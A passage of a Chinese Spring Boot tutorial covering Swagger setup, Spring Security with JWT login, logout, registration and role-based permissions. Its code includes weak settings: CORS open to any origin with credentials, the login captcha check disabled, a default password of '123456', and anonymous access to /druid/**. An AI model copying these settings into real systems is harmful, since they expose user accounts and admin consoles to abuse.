.securityContexts(securityContexts()); } /** * 安全模式，这里指定token通过Authorization头请求头传递 */ private List\u0026lt;SecurityScheme\u0026gt; securitySchemes() { List\u0026lt;SecurityScheme\u0026gt; apiKeyList = new ArrayList\u0026lt;SecurityScheme\u0026gt;(); apiKeyList.add(new ApiKey(\u0026#34;Authorization\u0026#34;, \u0026#34;Authorization\u0026#34;, In.HEADER.toValue())); return apiKeyList; } /** * 安全上下文 */ private List\u0026lt;SecurityContext\u0026gt; securityContexts() { List\u0026lt;SecurityContext\u0026gt; securityContexts = new ArrayList\u0026lt;\u0026gt;(); securityContexts.add( SecurityContext.builder() .securityReferences(defaultAuth()) .operationSelector(o -\u0026gt; o.requestMappingPattern().matches(\u0026#34;/.*\u0026#34;)) .build()); return securityContexts; } /** * 默认的安全上引用 */ private List\u0026lt;SecurityReference\u0026gt; defaultAuth() { AuthorizationScope authorizationScope = new AuthorizationScope(\u0026#34;global\u0026#34;, \u0026#34;accessEverything\u0026#34;); AuthorizationScope[] authorizationScopes = new AuthorizationScope[1]; authorizationScopes[0] = authorizationScope; List\u0026lt;SecurityReference\u0026gt; securityReferences = new ArrayList\u0026lt;\u0026gt;(); securityReferences.add(new SecurityReference(\u0026#34;Authorization\u0026#34;, authorizationScopes)); return securityReferences; } /** * 添加摘要信息 */ private ApiInfo apiInfo() { // 用ApiInfoBuilder进行定制 return new ApiInfoBuilder() // 设置标题 .title(\u0026#34;OPENGMS LAB接口文档\u0026#34;) // 描述 // .description(\u0026#34;接口文档 description\u0026#34;) // 作者信息 .contact(new Contact(labConfig.getName(), null, null)) // 版本 .version(\u0026#34;版本号:\u0026#34; + labConfig.getVersion()) .build(); } @Override public void addResourceHandlers(ResourceHandlerRegistry registry) { /** swagger配置 */ registry.addResourceHandler(\u0026#34;/swagger-ui/**\u0026#34;) .addResourceLocations(\u0026#34;classpath:/META-INF/resources/webjars/springfox-swagger-ui/\u0026#34;); // registry.addResourceHandler(\u0026#34;/**\u0026#34;).addResourceLocations(\u0026#34;classpath:/static/\u0026#34;); // // // 解决swagger无法访问 // registry.addResourceHandler(\u0026#34;/swagger-ui.html\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/\u0026#34;); // // // 解决swagger的js文件无法访问 // registry.addResourceHandler(\u0026#34;/webjars/**\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/webjars/\u0026#34;); } } 3.使用 swagger2的3.0版本的访问地址/swagger-ui/index.html 2.x之前访问地址/swagger-ui.html\n访问http://localhost:8888/swagger-ui/index.html\n使用Swagger Tools插件自动生成接口文档注解：Alt + Ins\n4.集成Knife4j 添加pom\n1 2 3 4 5 6 \u0026lt;!-- knife4j --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 访问地址\nhttp://localhost:8888/doc.html\n参数配置 1.创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 -- ---------------------------- -- 参数配置表 -- ---------------------------- drop table if exists sys_config; create table sys_config ( config_id int(5) not null auto_increment comment \u0026#39;参数主键\u0026#39;, config_name varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数名称\u0026#39;, config_key varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数键名\u0026#39;, config_value varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;参数键值\u0026#39;, config_type char(1) default \u0026#39;N\u0026#39; comment \u0026#39;系统内置（Y是 N否）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (config_id) ) engine=innodb auto_increment=100 comment = \u0026#39;参数配置表\u0026#39;; insert into sys_config values(1, \u0026#39;主框架页-默认皮肤样式名称\u0026#39;, \u0026#39;sys.index.skinName\u0026#39;, \u0026#39;skin-blue\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;蓝色 skin-blue、绿色 skin-green、紫色 skin-purple、红色 skin-red、黄色 skin-yellow\u0026#39; ); insert into sys_config values(2, \u0026#39;用户管理-账号初始密码\u0026#39;, \u0026#39;sys.user.initPassword\u0026#39;, \u0026#39;123456\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;初始化密码 123456\u0026#39; ); insert into sys_config values(3, \u0026#39;主框架页-侧边栏主题\u0026#39;, \u0026#39;sys.index.sideTheme\u0026#39;, \u0026#39;theme-dark\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;深色主题theme-dark，浅色主题theme-light\u0026#39; ); insert into sys_config values(4, \u0026#39;账号自助-验证码开关\u0026#39;, \u0026#39;sys.account.captchaEnabled\u0026#39;, \u0026#39;true\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;是否开启验证码功能（true开启，false关闭）\u0026#39;); insert into sys_config values(5, \u0026#39;账号自助-是否开启用户注册功能\u0026#39;, \u0026#39;sys.account.registerUser\u0026#39;, \u0026#39;false\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;是否开启注册用户功能（true开启，false关闭）\u0026#39;); 2.初始化参数 SysConfigServiceImpl\n1 2 3 4 5 6 7 8 /** * 项目启动时，初始化参数到缓存 */ @PostConstruct public void init() { loadingConfigCache(); } 登录和授权 登录实现 1.引入 Spring Security 模块 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 引入依赖后我们在尝试去访问之前的接口就会自动跳转到一个SpringSecurity的默认登陆页面，默认用户名是user,密码会输出在控制台。 必须登陆之后才能对接口进行访问。\n2.编写 Spring Security 配置类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { /** * 自定义用户认证逻辑 */ @Autowired private UserDetailsService userDetailsService; /** * 认证失败处理类 */ @Autowired private AuthenticationEntryPointImpl unauthorizedHandler; /** * 退出处理类 */ @Autowired private LogoutSuccessHandlerImpl logoutSuccessHandler; /** * token认证过滤器 */ @Autowired private JwtAuthenticationTokenFilter authenticationTokenFilter; /** * 跨域过滤器 */ @Autowired private CorsFilter corsFilter; /** * 允许匿名访问的地址 */ @Autowired private PermitAllUrlProperties permitAllUrl; /** * 解决 无法直接注入 AuthenticationManager * * @return * @throws Exception */ @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * anyRequest | 匹配所有请求路径 * access | SpringEl表达式结果为true时可以访问 * anonymous | 匿名可以访问 * denyAll | 用户不能访问 * fullyAuthenticated | 用户完全认证可以访问（非remember-me下自动登录） * hasAnyAuthority | 如果有参数，参数表示权限，则其中任何一个权限可以访问 * hasAnyRole | 如果有参数，参数表示角色，则其中任何一个角色可以访问 * hasAuthority | 如果有参数，参数表示权限，则其权限可以访问 * hasIpAddress | 如果有参数，参数表示IP地址，如果用户IP和参数匹配，则可以访问 * hasRole | 如果有参数，参数表示角色，则其角色可以访问 * permitAll | 用户可以任意访问 * rememberMe | 允许通过remember-me登录的用户访问 * authenticated | 用户登录后可访问 */ @Override protected void configure(HttpSecurity httpSecurity) throws Exception { // 注解标记允许匿名访问的url ExpressionUrlAuthorizationConfigurer\u0026lt;HttpSecurity\u0026gt;.ExpressionInterceptUrlRegistry registry = httpSecurity.authorizeRequests(); permitAllUrl.getUrls().forEach(url -\u0026gt; registry.antMatchers(url).permitAll()); httpSecurity // CSRF禁用，因为不使用session // 关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求 .csrf().disable() // 认证失败处理类 .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and() // 基于token，所以不需要session .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and() // 过滤请求 .authorizeRequests() // 对于登录login 注册register 验证码captchaImage 允许匿名访问 .antMatchers(\u0026#34;/login\u0026#34;, \u0026#34;/register\u0026#34;, \u0026#34;/captchaImage\u0026#34;).anonymous() // 静态资源，可匿名访问 .antMatchers(HttpMethod.GET, \u0026#34;/\u0026#34;, \u0026#34;/*.html\u0026#34;, \u0026#34;/**/*.html\u0026#34;, \u0026#34;/**/*.css\u0026#34;, \u0026#34;/**/*.js\u0026#34;, \u0026#34;/profile/**\u0026#34;).permitAll() .antMatchers(\u0026#34;/swagger-ui.html\u0026#34;, \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/*/api-docs\u0026#34;, \u0026#34;/druid/**\u0026#34;).permitAll() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated() .and() .headers().frameOptions().disable(); // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); // 添加JWT filter httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); // 添加CORS filter httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class); httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class); // 开启自动配置的登录功能 // http.formLogin() // .loginPage(\u0026#34;/toLogin\u0026#34;) //自定义登录页 // .loginProcessingUrl(\u0026#34;/loginRequest\u0026#34;) // 登陆表单提交的请求 // .passwordParameter(\u0026#34;password\u0026#34;); // 表单中password需与该处对应。默认是password // http.formLogin(); // 开启自动配置的注销的功能 // http.logout().logoutSuccessUrl(\u0026#34;/\u0026#34;); // 注销成功来到首页 // 记住我 // http.rememberMe(); // http.rememberMe(). // rememberMeParameter(\u0026#34;remember\u0026#34;); // 定制记住我的参数 } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 3.配置类相关模块 UserDetailsService 自定义用户认证逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Service public class UserDetailsServiceImpl implements UserDetailsService { private static final Logger log = LoggerFactory.getLogger(UserDetailsServiceImpl.class); @Autowired private ISysUserService userService; @Autowired private SysPasswordService passwordService; @Autowired private SysPermissionService permissionService; @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); if (StringUtils.isNull(user)) { log.info(\u0026#34;登录用户：{} 不存在.\u0026#34;, username); throw new ServiceException(\u0026#34;登录用户：\u0026#34; + username + \u0026#34; 不存在\u0026#34;); } else if (UserStatus.DELETED.getCode().equals(user.getDelFlag())) { log.info(\u0026#34;登录用户：{} 已被删除.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已被删除\u0026#34;); } else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) { log.info(\u0026#34;登录用户：{} 已被停用.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已停用\u0026#34;); } passwordService.validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user); } } AuthenticationEntryPointImpl 认证失败处理类 返回未授权\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Component public class AuthenticationEntryPointImpl implements AuthenticationEntryPoint, Serializable { private static final long serialVersionUID = -8970718410437077606L; @Override public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException e) throws IOException { int code = HttpStatus.UNAUTHORIZED; String msg = StringUtils.format(\u0026#34;请求访问：{}，认证失败，无法访问系统资源\u0026#34;, request.getRequestURI()); ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(code, msg))); } } LogoutSuccessHandlerImpl 自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } JwtAuthenticationTokenFiltertoken token过滤器 验证token有效性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken) } chain.doFilter(request, response); } } ResourcesConfig 跨域过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration public class ResourcesConfig implements WebMvcConfigurer { /** * 跨域配置 */ @Bean public CorsFilter corsFilter() { CorsConfiguration config = new CorsConfiguration(); config.setAllowCredentials(true); // 设置访问源地址 config.addAllowedOriginPattern(\u0026#34;*\u0026#34;); // 设置访问源请求头 config.addAllowedHeader(\u0026#34;*\u0026#34;); // 设置访问源请求方法 config.addAllowedMethod(\u0026#34;*\u0026#34;); // 有效期 1800秒 config.setMaxAge(1800L); // 添加映射路径，拦截一切请求 UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(\u0026#34;/**\u0026#34;, config); // 返回新的CorsFilter return new CorsFilter(source); } } PermitAllUrlProperties 设置Anonymous注解允许匿名访问的url\n参考链接：\nApplicationContextAware接口的作用\n这个接口其实就是获取Spring容器的Bean，在我们写一些框架代码时，或者是看一些框架源码时经常会看到这个接口ApplicationContextAware 的使用，Spring容器会检测容器中的所有Bean，如果发现某个Bean实现了ApplicationContextAware接口，Spring容器会在创建该Bean之后，自动调用该Bean的setApplicationContextAware()方法，调用该方法时，会将容器本身作为参数传给该方法——该方法中的实现部分将Spring传入的参数（容器本身）赋给该类对象的applicationContext实例变量，因此接下来可以通过该applicationContext实例变量来访问容器本身\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 @Configuration public class PermitAllUrlProperties implements InitializingBean, ApplicationContextAware { private static final Pattern PATTERN = Pattern.compile(\u0026#34;\\\\{(.*?)\\\\}\u0026#34;); private ApplicationContext applicationContext; private List\u0026lt;String\u0026gt; urls = new ArrayList\u0026lt;\u0026gt;(); public String ASTERISK = \u0026#34;*\u0026#34;; @Override public void afterPropertiesSet() { RequestMappingHandlerMapping mapping = applicationContext.getBean(RequestMappingHandlerMapping.class); Map\u0026lt;RequestMappingInfo, HandlerMethod\u0026gt; map = mapping.getHandlerMethods(); map.keySet().forEach(info -\u0026gt; { HandlerMethod handlerMethod = map.get(info); // 获取方法上边的注解 替代path variable 为 * Anonymous method = AnnotationUtils.findAnnotation(handlerMethod.getMethod(), Anonymous.class); Optional.ofNullable(method).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); // 获取类上边的注解, 替代path variable 为 * Anonymous controller = AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), Anonymous.class); Optional.ofNullable(controller).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); }); } @Override public void setApplicationContext(ApplicationContext context) throws BeansException { this.applicationContext = context; } public List\u0026lt;String\u0026gt; getUrls() { return urls; } public void setUrls(List\u0026lt;String\u0026gt; urls) { this.urls = urls; } } 4.登录模块 authenticationManager.authenticate 会调用 UserDetailsServiceImpl.loadUserByUsername 进行身份认证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 public String login(String username, String password, String code, String uuid) { // boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (false) { // validateCaptcha(username, code, uuid); } // 用户验证 Authentication authentication = null; try { UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(username, password); AuthenticationContextHolder.setContext(authenticationToken); // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername authentication = authenticationManager.authenticate(authenticationToken); } catch (Exception e) { if (e instanceof BadCredentialsException) { String message = MessageUtils.message(\u0026#34;user.password.not.match\u0026#34;); asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, message); throw new ServiceException(message); } else { asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, e.getMessage()); throw new ServiceException(e.getMessage()); } } asyncService.recordLogininfor(username, Constants.LOGIN_SUCCESS, MessageUtils.message(\u0026#34;user.login.success\u0026#34;)); LoginUser loginUser = (LoginUser) authentication.getPrincipal(); recordLoginInfo(loginUser.getUserId()); // 生成token return tokenService.createToken(loginUser); } 5.登出模块 SecurityConfig中添加登出过滤链\n1 2 // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); LogoutSuccessHandlerImpl自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } 6.注册模块 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public String register(RegisterDTO registerBody) { String msg = \u0026#34;\u0026#34;, username = registerBody.getUsername(), password = registerBody.getPassword(); boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (captchaEnabled) { // validateCaptcha(username, registerBody.getCode(), registerBody.getUuid()); } if (StringUtils.isEmpty(username)) { msg = \u0026#34;用户名不能为空\u0026#34;; } else if (StringUtils.isEmpty(password)) { msg = \u0026#34;用户密码不能为空\u0026#34;; } else if (username.length() \u0026lt; UserConstants.USERNAME_MIN_LENGTH || username.length() \u0026gt; UserConstants.USERNAME_MAX_LENGTH) { msg = \u0026#34;账户长度必须在2到20个字符之间\u0026#34;; } else if (password.length() \u0026lt; UserConstants.PASSWORD_MIN_LENGTH || password.length() \u0026gt; UserConstants.PASSWORD_MAX_LENGTH) { msg = \u0026#34;密码长度必须在5到20个字符之间\u0026#34;; } else if (UserConstants.NOT_UNIQUE.equals(userService.checkUserNameUnique(username))) { msg = \u0026#34;保存用户\u0026#39;\u0026#34; + username + \u0026#34;\u0026#39;失败，注册账号已存在\u0026#34;; } else { SysUser sysUser = new SysUser(); sysUser.setUserName(username); sysUser.setPassword(SecurityUtils.encryptPassword(registerBody.getPassword())); boolean regFlag = userService.registerUser(sysUser); if (!regFlag) { msg = \u0026#34;注册失败,请联系系统管理人员\u0026#34;; } else { asyncService.recordLogininfor(username, Constants.REGISTER, MessageUtils.message(\u0026#34;user.register.success\u0026#34;)); } } return msg; } 授权实现 1.创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 -- ---------------------------- -- 角色信息表 -- ---------------------------- drop table if exists sys_role; create table sys_role ( role_id bigint(20) not null auto_increment comment \u0026#39;角色ID\u0026#39;, role_name varchar(30) not null comment \u0026#39;角色名称\u0026#39;, role_key varchar(100) not null comment \u0026#39;角色权限字符串\u0026#39;, role_sort int(4) not null comment \u0026#39;显示顺序\u0026#39;, data_scope char(1) default \u0026#39;1\u0026#39; comment \u0026#39;数据范围（1：全部数据权限 2：自定数据权限 3：本部门数据权限 4：本部门及以下数据权限）\u0026#39;, menu_check_strictly tinyint(1) default 1 comment \u0026#39;菜单树选择项是否关联显示\u0026#39;, dept_check_strictly tinyint(1) default 1 comment \u0026#39;部门树选择项是否关联显示\u0026#39;, status char(1) not null comment \u0026#39;角色状态（0正常 1停用）\u0026#39;, del_flag char(1) default \u0026#39;0\u0026#39; comment \u0026#39;删除标志（0代表存在 2代表删除）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (role_id) ) engine=innodb auto_increment=100 comment = \u0026#39;角色信息表\u0026#39;; -- ---------------------------- -- 菜单权限表 -- ---------------------------- drop table if exists sys_menu; create table sys_menu ( menu_id bigint(20) not null auto_increment comment \u0026#39;菜单ID\u0026#39;, menu_name varchar(50) not null comment \u0026#39;菜单名称\u0026#39;, parent_id bigint(20) default 0 comment \u0026#39;父菜单ID\u0026#39;, order_num int(4) default 0 comment \u0026#39;显示顺序\u0026#39;, path varchar(200) default \u0026#39;\u0026#39; comment \u0026#39;路由地址\u0026#39;, component varchar(255) default null comment \u0026#39;组件路径\u0026#39;, query varchar(255) default null comment \u0026#39;路由参数\u0026#39;, is_frame int(1) default 1 comment \u0026#39;是否为外链（0是 1否）\u0026#39;, is_cache int(1) default 0 comment \u0026#39;是否缓存（0缓存 1不缓存）\u0026#39;, menu_type char(1) default \u0026#39;\u0026#39; comment \u0026#39;菜单类型（M目录 C菜单 F按钮）\u0026#39;, visible char(1) default 0 comment \u0026#39;菜单状态（0显示 1隐藏）\u0026#39;, status char(1) default 0 comment \u0026#39;菜单状态（0正常 1停用）\u0026#39;, perms varchar(100) default null comment \u0026#39;权限标识\u0026#39;, icon varchar(100) default \u0026#39;#\u0026#39; comment \u0026#39;菜单图标\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;备注\u0026#39;, primary key (menu_id) ) engine=innodb auto_increment=2000 comment = \u0026#39;菜单权限表\u0026#39;; -- ---------------------------- -- 角色和菜单关联表 角色1-N菜单 -- ---------------------------- drop table if exists sys_role_menu; create table sys_role_menu ( role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, menu_id bigint(20) not null comment \u0026#39;菜单ID\u0026#39;, primary key(role_id, menu_id) ) engine=innodb comment = \u0026#39;角色和菜单关联表\u0026#39;; -- ---------------------------- -- 用户和角色关联表 用户N-1角色 -- ---------------------------- drop table if exists sys_user_role; create table sys_user_role ( user_id bigint(20) not null comment \u0026#39;用户ID\u0026#39;, role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, primary key(user_id, role_id) ) engine=innodb comment = \u0026#39;用户和角色关联表\u0026#39;; 2.权限过滤器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } 3.登录时权限赋值 在 UserDetailsServiceImpl 的 loadUserByUsername 中为user赋上权限\n4.权限查询Mapper 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;select id=\u0026#34;selectMenuListByUserId\u0026#34; parameterType=\u0026#34;SysMenu\u0026#34; resultMap=\u0026#34;SysMenuResult\u0026#34;\u0026gt; select distinct m.menu_id, m.parent_id, m.menu_name, m.path, m.component, m.`query`, m.visible, m.status, ifnull(m.perms,\u0026#39;\u0026#39;) as perms, m.is_frame, m.is_cache, m.menu_type, m.icon, m.order_num, m.create_time from sys_menu m left join sys_role_menu rm on m.menu_id = rm.menu_id left join sys_user_role ur on rm.role_id = ur.role_id left join sys_role ro on ur.role_id = ro.role_id where ur.user_id = #{params.userId} \u0026lt;if test=\u0026#34;menuName != null and menuName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.menu_name like concat(\u0026#39;%\u0026#39;, #{menuName}, \u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;visible != null and visible != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.visible = #{visible} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null and status != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.status = #{status} \u0026lt;/if\u0026gt; order by m.parent_id, m.order_num \u0026lt;/select\u0026gt; 5.自定义权限方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Service(\u0026#34;ss\u0026#34;) public class PermissionService { /** 所有权限标识 */ private static final String ALL_PERMISSION = \u0026#34;*:*:*\u0026#34;; /** 管理员角色权限标识 */ private static final String SUPER_ADMIN = \u0026#34;admin\u0026#34;; private static final String ROLE_DELIMETER = \u0026#34;,\u0026#34;; private static final String PERMISSION_DELIMETER = \u0026#34;,\u0026#34;; /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } } 6.接口实现 1 2 3 4 5 6 7 8 9 10 /** * 获取菜单列表 */ @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:menu:list\u0026#39;)\u0026#34;) @GetMapping(\u0026#34;/list\u0026#34;) public AjaxResult list(SysMenu 